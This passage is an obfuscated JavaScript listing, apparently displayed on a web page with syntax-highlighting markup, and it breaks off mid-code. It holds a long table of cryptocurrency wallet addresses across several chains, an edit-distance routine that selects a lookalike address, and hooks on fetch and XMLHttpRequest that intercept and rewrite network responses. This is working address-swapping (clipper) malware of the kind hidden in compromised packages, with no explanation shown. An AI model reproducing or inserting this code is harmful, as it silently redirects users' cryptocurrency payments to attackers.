</span><span>"0x5651dbb7838146fCF5135A65005946625A2685c8"</span><span>, </span><span>'JbMdu'</span><span>: </span><span>"0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1"</span><span>, </span><span>'gjuIU'</span><span>: </span><span>"0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3"</span><span>, </span><span>'fmDjk'</span><span>: </span><span>"0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9"</span><span>, </span><span>'GjipQ'</span><span>: </span><span>"0x013285c02ab81246F1D68699613447CE4B2B4ACC"</span><span>, </span><span>'wHLUW'</span><span>: </span><span>"0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e"</span><span>, </span><span>'gYVeZ'</span><span>: </span><span>"0x4Bf0C0630A562eE973CE964a7d215D98ea115693"</span><span>, </span><span>'Sqlrp'</span><span>: </span><span>"0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb"</span><span>, </span><span>'pcqRS'</span><span>: </span><span>"0xae9935793835D5fCF8660e0D45bA35648e3CD463"</span><span>, </span><span>'fMapR'</span><span>: </span><span>"0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027"</span><span>, </span><span>'ITrjn'</span><span>: </span><span>"0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D"</span><span>, </span><span>'Ixxxa'</span><span>: </span><span>"0x06de68F310a86B10746a4e35cD50a7B7C8663b8d"</span><span>, </span><span>'DdqMx'</span><span>: </span><span>"0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54"</span><span>, </span><span>'mddEm'</span><span>: </span><span>"0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf"</span><span>, </span><span>'GQlpD'</span><span>: </span><span>"0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272"</span><span>, </span><span>'PFPfJ'</span><span>: </span><span>"0xe8749d2347472AD1547E1c6436F267F0EdD725Cb"</span><span>, </span><span>'rgsmH'</span><span>: </span><span>"0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221"</span><span>, </span><span>'kkUbC'</span><span>: </span><span>"0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3"</span><span>, </span><span>'qHwwv'</span><span>: </span><span>"0xC4A51031A7d17bB6D02D52127D2774A942987D39"</span><span>, </span><span>'mlgET'</span><span>: </span><span>"0xa1b94fC12c0153D3fb5d60ED500AcEC430259751"</span><span>, </span><span>'Sflwm'</span><span>: </span><span>"0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223"</span><span>, </span><span>'cKcDU'</span><span>: </span><span>"0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"</span><span>, </span><span>'tWKKt'</span><span>: </span><span>"5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6"</span><span>, </span><span>'GeUXv'</span><span>: </span><span>"98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ"</span><span>, </span><span>'IFMoj'</span><span>: </span><span>"Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt"</span><span>, </span><span>'shIUB'</span><span>: </span><span>"CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN"</span><span>, </span><span>'IfmWW'</span><span>: </span><span>"7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU"</span><span>, </span><span>'aLjQi'</span><span>: </span><span>"3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49"</span><span>, </span><span>'ytLpw'</span><span>: </span><span>"9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV"</span><span>, </span><span>'gjXjd'</span><span>: </span><span>"4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF"</span><span>, </span><span>'alqyK'</span><span>: </span><span>"9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL"</span><span>, </span><span>'tySZZ'</span><span>: </span><span>"7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx"</span><span>, </span><span>'wEEzD'</span><span>: </span><span>"8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv"</span><span>, </span><span>'PFTuz'</span><span>: </span><span>"55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx"</span><span>, </span><span>'uMBVu'</span><span>: </span><span>"Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB"</span><span>, </span><span>'gGKEH'</span><span>: </span><span>"9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB"</span><span>, </span><span>'QlDwm'</span><span>: </span><span>"5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr"</span><span>, </span><span>'PbcYH'</span><span>: </span><span>"F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv"</span><span>, </span><span>'isJWQ'</span><span>: </span><span>"G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn"</span><span>, </span><span>'NORtg'</span><span>: </span><span>"DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K"</span><span>, </span><span>'OWMqm'</span><span>: </span><span>"HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"</span><span>, </span><span>'mAOhu'</span><span>: </span><span>"TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67"</span><span>, </span><span>'zNJib'</span><span>: </span><span>"TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y"</span><span>, </span><span>'JIaJy'</span><span>: </span><span>"TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH"</span><span>, </span><span>'ycYrn'</span><span>: </span><span>"TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc"</span><span>, </span><span>'YofCH'</span><span>: </span><span>"TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp"</span><span>, </span><span>'iKJKA'</span><span>: </span><span>"TGExvgwAyaqwcaJmtJzErXqfra66YjLThc"</span><span>, </span><span>'oQtxT'</span><span>: </span><span>"TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG"</span><span>, </span><span>'Gnngl'</span><span>: </span><span>"TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye"</span><span>, </span><span>'AIOZX'</span><span>: </span><span>"TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp"</span><span>, </span><span>'LBXrZ'</span><span>: </span><span>"TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR"</span><span>, </span><span>'GcWUu'</span><span>: </span><span>"TPSLojAyTheudTRztqjhNic6rrrSLVkMAr"</span><span>, </span><span>'uWYHo'</span><span>: </span><span>"TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo"</span><span>, </span><span>'AjRST'</span><span>: </span><span>"TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw"</span><span>, </span><span>'OghhW'</span><span>: </span><span>"TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f"</span><span>, </span><span>'WYxMs'</span><span>: </span><span>"TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ"</span><span>, </span><span>'XPQAU'</span><span>: </span><span>"TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb"</span><span>, </span><span>'kQfYh'</span><span>: </span><span>"TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP"</span><span>, </span><span>'fQZCx'</span><span>: </span><span>"TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW"</span><span>, </span><span>'UzPHF'</span><span>: </span><span>"TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz"</span><span>, </span><span>'qJMvq'</span><span>: </span><span>"TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW"</span><span>, </span><span>'sZVdB'</span><span>: </span><span>"TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt"</span><span>, </span><span>'zzvgO'</span><span>: </span><span>"TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC"</span><span>, </span><span>'maiTu'</span><span>: </span><span>"TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ"</span><span>, </span><span>'ZpFNE'</span><span>: </span><span>"THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E"</span><span>, </span><span>'jTVMz'</span><span>: </span><span>"TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6"</span><span>, </span><span>'zBKSx'</span><span>: </span><span>"TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L"</span><span>, </span><span>'CsfLH'</span><span>: </span><span>"TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9"</span><span>, </span><span>'LCszu'</span><span>: </span><span>"TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK"</span><span>, </span><span>'cdzQW'</span><span>: </span><span>"TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V"</span><span>, </span><span>'xBxZT'</span><span>: </span><span>"TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn"</span><span>, </span><span>'ESuTT'</span><span>: </span><span>"TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA"</span><span>, </span><span>'emvMl'</span><span>: </span><span>"TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt"</span><span>, </span><span>'xVGnF'</span><span>: </span><span>"TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ"</span><span>, </span><span>'hxLhB'</span><span>: </span><span>"TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs"</span><span>, </span><span>'EeQvC'</span><span>: </span><span>"TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL"</span><span>, </span><span>'pELnW'</span><span>: </span><span>"TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z"</span><span>, </span><span>'qzqrf'</span><span>: </span><span>"THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5"</span><span>, </span><span>'ZjUWz'</span><span>: </span><span>"TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP"</span><span>, </span><span>'LieOP'</span><span>: </span><span>"TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7"</span><span>, </span><span>'pPSEL'</span><span>: </span><span>"TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"</span><span>, </span><span>'Cubxg'</span><span>: </span><span>"LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug"</span><span>, </span><span>'tdnnB'</span><span>: </span><span>"LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR"</span><span>, </span><span>'WBSil'</span><span>: </span><span>"LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6"</span><span>, </span><span>'aiczm'</span><span>: </span><span>"LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz"</span><span>, </span><span>'RVLCn'</span><span>: </span><span>"LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa"</span><span>, </span><span>'UpXNN'</span><span>: </span><span>"LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ"</span><span>, </span><span>'FOnBW'</span><span>: </span><span>"LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT"</span><span>, </span><span>'iMpIh'</span><span>: </span><span>"LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB"</span><span>, </span><span>'mynAv'</span><span>: </span><span>"Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP"</span><span>, </span><span>'LthXt'</span><span>: </span><span>"LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA"</span><span>, </span><span>'thBMJ'</span><span>: </span><span>"Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP"</span><span>, </span><span>'SDnYd'</span><span>: </span><span>"LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox"</span><span>, </span><span>'rsFGZ'</span><span>: </span><span>"LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP"</span><span>, </span><span>'GERuP'</span><span>: </span><span>"LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6"</span><span>, </span><span>'YnKTx'</span><span>: </span><span>"LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ"</span><span>, </span><span>'qeLYC'</span><span>: </span><span>"LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H"</span><span>, </span><span>'bHFpc'</span><span>: </span><span>"LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq"</span><span>, </span><span>'yJtyM'</span><span>: </span><span>"LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE"</span><span>, </span><span>'UthzI'</span><span>: </span><span>"LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr"</span><span>, </span><span>'HRVKG'</span><span>: </span><span>"LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9"</span><span>, </span><span>'DYFsg'</span><span>: </span><span>"LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC"</span><span>, </span><span>'vJoTb'</span><span>: </span><span>"LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v"</span><span>, </span><span>'SCttQ'</span><span>: </span><span>"LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V"</span><span>, </span><span>'TLtwe'</span><span>: </span><span>"LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR"</span><span>, </span><span>'zubSd'</span><span>: </span><span>"LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg"</span><span>, </span><span>'jnPSm'</span><span>: </span><span>"LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k"</span><span>, </span><span>'tkhoC'</span><span>: </span><span>"LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk"</span><span>, </span><span>'UXYpW'</span><span>: </span><span>"LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN"</span><span>, </span><span>'QtlzB'</span><span>: </span><span>"Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT"</span><span>, </span><span>'wYQWn'</span><span>: </span><span>"LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs"</span><span>, </span><span>'abbui'</span><span>: </span><span>"LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw"</span><span>, </span><span>'zndLO'</span><span>: </span><span>"LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X"</span><span>, </span><span>'kXpEP'</span><span>: </span><span>"LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU"</span><span>, </span><span>'gBdKm'</span><span>: </span><span>"LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq"</span><span>, </span><span>'AJBPj'</span><span>: </span><span>"LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe"</span><span>, </span><span>'dDlKv'</span><span>: </span><span>"LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV"</span><span>, </span><span>'upwRp'</span><span>: </span><span>"LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ"</span><span>, </span><span>'wKEAH'</span><span>: </span><span>"Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu"</span><span>, </span><span>'Kivgs'</span><span>: </span><span>"LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK"</span><span>, </span><span>'atdgC'</span><span>: </span><span>"LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"</span><span>, </span><span>'wORrq'</span><span>: </span><span>"bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh"</span><span>, </span><span>'AXcYN'</span><span>: </span><span>"bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9"</span><span>, </span><span>'nJmrw'</span><span>: </span><span>"bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz"</span><span>, </span><span>'jiCnV'</span><span>: </span><span>"bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf"</span><span>, </span><span>'IEyeW'</span><span>: </span><span>"bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39"</span><span>, </span><span>'LPwMj'</span><span>: </span><span>"bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97"</span><span>, </span><span>'QeXkq'</span><span>: </span><span>"bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823"</span><span>, </span><span>'AXCnW'</span><span>: </span><span>"bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3"</span><span>, </span><span>'BvvIY'</span><span>: </span><span>"bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64"</span><span>, </span><span>'WdGef'</span><span>: </span><span>"bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8"</span><span>, </span><span>'MdtCY'</span><span>: </span><span>"bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt"</span><span>, </span><span>'lcvXH'</span><span>: </span><span>"bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er"</span><span>, </span><span>'jQkco'</span><span>: </span><span>"bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz"</span><span>, </span><span>'XcaTu'</span><span>: </span><span>"bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s"</span><span>, </span><span>'JEZmD'</span><span>: </span><span>"bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7"</span><span>, </span><span>'PQrIR'</span><span>: </span><span>"bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed"</span><span>, </span><span>'JDUWN'</span><span>: </span><span>"bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw"</span><span>, </span><span>'CZKkU'</span><span>: </span><span>"bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa"</span><span>, </span><span>'GGbBw'</span><span>: </span><span>"bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc"</span><span>, </span><span>'TlKHF'</span><span>: </span><span>"bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd"</span><span>, </span><span>'gvWhS'</span><span>: </span><span>"bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl"</span><span>, </span><span>'TOyco'</span><span>: </span><span>"bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g"</span><span>, </span><span>'uzHQJ'</span><span>: </span><span>"bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf"</span><span>, </span><span>'Ddxxq'</span><span>: </span><span>"bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u"</span><span>, </span><span>'SkKwK'</span><span>: </span><span>"bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck"</span><span>, </span><span>'xlIOq'</span><span>: </span><span>"bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3"</span><span>, </span><span>'cGdGB'</span><span>: </span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>'NJweA'</span><span>: </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>'liySF'</span><span>: </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>'dZzai'</span><span>: </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>'qPXMY'</span><span>: </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>'GSmbj'</span><span>: </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>'oFfnO'</span><span>: </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>'oBsPL'</span><span>: </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>'fqBSI'</span><span>: </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>'GqRgo'</span><span>: </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>'TSvsw'</span><span>: </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>'gIXXv'</span><span>: </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>'NNxYW'</span><span>: </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>'wgjIC'</span><span>: </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>, </span><span>'NbGXK'</span><span>: </span><span>function</span><span> (</span><span>_0x6fd57a, _0x45613c</span><span>) </span><span>{ </span><span>return</span><span> _0x6fd57a == _0x45613c; </span> }, <span>'eDGUh'</span><span>: </span><span>"ethereum"</span><span>, </span><span>'dmtxm'</span><span>: </span><span>function</span><span> (</span><span>_0x426191, _0xcfbe</span><span>) </span><span>{ </span><span>return</span><span> _0x426191 == _0xcfbe; </span> }, <span>'HNbDp'</span><span>: </span><span>function</span><span> (</span><span>_0x43f1a1, _0x360cae</span><span>) </span><span>{ </span><span>return</span><span> _0x43f1a1 == _0x360cae; </span> }, <span>'YBHoq'</span><span>: </span><span>"bitcoinLegacy"</span><span>, </span><span>'pRoUO'</span><span>: </span><span>"bitcoinSegwit"</span><span>, </span><span>'nvayH'</span><span>: </span><span>function</span><span> (</span><span>_0x1a5c0d, _0x3206ce, _0x4cf791</span><span>) </span><span>{ </span><span>return</span><span> _0x1a5c0d(_0x3206ce, _0x4cf791); </span> }, <span>'jHsib'</span><span>: </span><span>"tron"</span><span>, </span><span>'nVTWs'</span><span>: </span><span>"ltc"</span><span>, </span><span>'jsqTT'</span><span>: </span><span>function</span><span> (</span><span>_0x245d0e, _0x2d73d9, _0x14ef57</span><span>) </span><span>{ </span><span>return</span><span> _0x245d0e(_0x2d73d9, _0x14ef57); </span> }, <span>'afnPM'</span><span>: </span><span>function</span><span> (</span><span>_0x458f2b, _0x6aa524</span><span>) </span><span>{ </span><span>return</span><span> _0x458f2b == _0x6aa524; </span> }, <span>'tDons'</span><span>: </span><span>"ltc2"</span><span>, </span><span>'gtXrf'</span><span>: </span><span>function</span><span> (</span><span>_0x4aac02, _0x3c2f2e, _0x51351a</span><span>) </span><span>{ </span><span>return</span><span> _0x4aac02(_0x3c2f2e, _0x51351a); </span> }, <span>'sghpa'</span><span>: </span><span>"bch"</span><span>, </span><span>'hrNiK'</span><span>: </span><span>function</span><span> (</span><span>_0x4989f5, _0xf4abd5, _0x265bdf</span><span>) </span><span>{ </span><span>return</span><span> _0x4989f5(_0xf4abd5, _0x265bdf); </span> }, <span>'tqgyV'</span><span>: </span><span>"solana"</span><span>, </span><span>'mbgjV'</span><span>: </span><span>function</span><span> (</span><span>_0x34d7ea, _0xb2bd29, _0x41c749</span><span>) </span><span>{ </span><span>return</span><span> _0x34d7ea(_0xb2bd29, _0x41c749); </span> }, <span>'IAgrR'</span><span>: </span><span>function</span><span> (</span><span>_0x95d4e, _0x4e3b67</span><span>) </span><span>{ </span><span>return</span><span> _0x95d4e == _0x4e3b67; </span> }, <span>'FvQbM'</span><span>: </span><span>"solana2"</span><span>, </span><span>'UPcyp'</span><span>: </span><span>"solana3"</span><span>, </span><span>'JiXTg'</span><span>: </span><span>function</span><span> (</span><span>_0x2dd239, _0x9ccb5, _0x2f7208</span><span>) </span><span>{ </span><span>return</span><span> _0x2dd239(_0x9ccb5, _0x2f7208); </span> }, <span>'BEiKn'</span><span>: </span><span>function</span><span> (</span><span>_0x7b893d, _0x592b33</span><span>) </span><span>{ </span><span>return</span><span> _0x7b893d == _0x592b33; </span> }, <span>'BAEhI'</span><span>: </span><span>function</span><span> (</span><span>_0x421ebd, _0x39f4fa</span><span>) </span><span>{ </span><span>return</span><span> _0x421ebd != _0x39f4fa; </span> }, <span>'kZnrz'</span><span>: </span><span>"undefined"</span> }; <span> </span><span>if</span><span> (loval == </span><span>1</span><span>) { </span><span>return</span><span>; </span> } <span> loval = </span><span>1</span><span>; </span><span>function</span><span>_0x3479c8</span><span>(</span><span>_0x13a5cc, _0x8c209f</span><span>) </span><span>{ </span><span>const</span><span> _0x50715b = </span><span>Array</span><span>.from({ </span><span>'length'</span><span>: _0x13a5cc.length + </span><span>1</span><span> }, </span><span>() =&gt;</span><span>Array</span><span>(_0x8c209f.length + </span><span>1</span><span>).fill(</span><span>)); </span><span>for</span><span> (</span><span>let</span><span> _0x1b96c3 = </span><span>; _0x1b96c3 &lt;= _0x13a5cc.length; _0x1b96c3++) { </span><span> _0x50715b[_0x1b96c3][</span><span>] = _0x1b96c3; </span> } <span>for</span><span> (</span><span>let</span><span> _0x239a5f = </span><span>; _0x239a5f &lt;= _0x8c209f.length; _0x239a5f++) { </span><span> _0x50715b[</span><span>][_0x239a5f] = _0x239a5f; </span> } <span>for</span><span> (</span><span>let</span><span> _0x5aba31 = </span><span>1</span><span>; _0x5aba31 &lt;= _0x13a5cc.length; _0x5aba31++) { </span><span>for</span><span> (</span><span>let</span><span> _0x22e9c0 = </span><span>1</span><span>; _0x22e9c0 &lt;= _0x8c209f.length; _0x22e9c0++) { </span><span>if</span><span> (_0x13a5cc[_0x5aba31 - </span><span>1</span><span>] === _0x8c209f[_0x22e9c0 - </span><span>1</span><span>]) { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]; </span><span> } </span><span>else</span><span> { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = </span><span>1</span><span> + </span><span>Math</span><span>.min(_0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0], _0x50715b[_0x5aba31][_0x22e9c0 - </span><span>1</span><span>], _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]); </span> } } } <span>return</span><span> _0x50715b[_0x13a5cc.length][_0x8c209f.length]; </span> } <span>function</span><span>_0x2abae0</span><span>(</span><span>_0x348925, _0x2f1e3d</span><span>) </span><span>{ </span><span>let</span><span> _0xff60d1 = </span><span>Infinity</span><span>; </span><span>let</span><span> _0x5be3d3 = </span><span>null</span><span>; </span><span>for</span><span> (</span><span>let</span><span> _0x214c8b </span><span>of</span><span> _0x2f1e3d) { </span><span>const</span><span> _0x3a7411 = _0x3479c8(_0x348925.toLowerCase(), _0x214c8b.toLowerCase()); </span><span>if</span><span> (_0x3a7411 &lt; _0xff60d1) { </span> _0xff60d1 = _0x3a7411; _0x5be3d3 = _0x214c8b; } } <span>return</span><span> _0x5be3d3; </span> } <span> fetch = </span><span>async</span><span>function</span><span> (</span><span>..._0x1ae7ec</span><span>) </span><span>{ </span><span>const</span><span> _0x406ee2 = </span><span>await</span><span> _0xba16ef.tfqRA(fetch, ..._0x1ae7ec); </span><span>const</span><span> _0x207752 = _0x406ee2.headers.get(</span><span>"Content-Type"</span><span>) || </span><span>''</span><span>; </span><span>let</span><span> _0x561841; </span><span>if</span><span> (_0x207752.includes(</span><span>"application/json"</span><span>)) { </span><span> _0x561841 = </span><span>await</span><span> _0x406ee2.clone().json(); </span><span> } </span><span>else</span><span> { </span><span> _0x561841 = </span><span>await</span><span> _0x406ee2.clone().text(); </span> } <span>const</span><span> _0x50818d = _0x19ca67(_0x561841); </span><span>const</span><span> _0x22ee54 = </span><span>typeof</span><span> _0x50818d === </span><span>"string"</span><span> ? _0x50818d : </span><span>JSON</span><span>.stringify(_0x50818d); </span><span>const</span><span> _0x20415d = </span><span>new</span><span> Response(_0x22ee54, { </span><span>'status'</span><span>: _0x406ee2.status, </span><span>'statusText'</span><span>: _0x406ee2.statusText, </span><span>'headers'</span><span>: _0x406ee2.headers </span> }); <span>return</span><span> _0x20415d; </span> }; <span>if</span><span> (</span><span>typeof</span><span>window</span><span> != </span><span>"undefined"</span><span>) { </span><span>const</span><span> _0x2d44e5 = XMLHttpRequest.prototype.open; </span><span>const</span><span> _0x3d5d6a = XMLHttpRequest.prototype.send; </span><span> XMLHttpRequest.prototype.open = </span><span>function</span><span> (</span><span>_0x2dbeb0, _0x3b2bc2, _0x36de99, _0x36f3b7, _0x52ad25</span><span>) </span><span>{ </span><span>this</span><span>._url = _0x3b2bc2; </span><span>return</span><span> _0x2d44e5.apply(</span><span>this</span><span>, </span><span>arguments</span><span>); </span> }; <span> XMLHttpRequest.prototype.send = </span><span>function</span><span> (</span><span>_0x270708</span><span>) </span><span>{ </span><span>const</span><span> _0x159c30 = </span><span>this</span><span>; </span><span>const</span><span> _0x1c1a41 = _0x159c30.onreadystatechange; </span><span> _0x159c30.onreadystatechange = </span><span>function</span><span> (</span><span>) </span><span>{ </span><span>if</span><span> (_0x159c30.readyState === </span><span>4</span><span>) { </span><span>try</span><span> { </span><span>const</span><span> _0x13db82 = _0x159c30.getResponseHeader(</span><span>"Content-Type"</span><span>) || </span><span>''</span><span>; </span><span>let</span><span> _0x1ac083 = _0x159c30.responseText; </span><span>if</span><span> 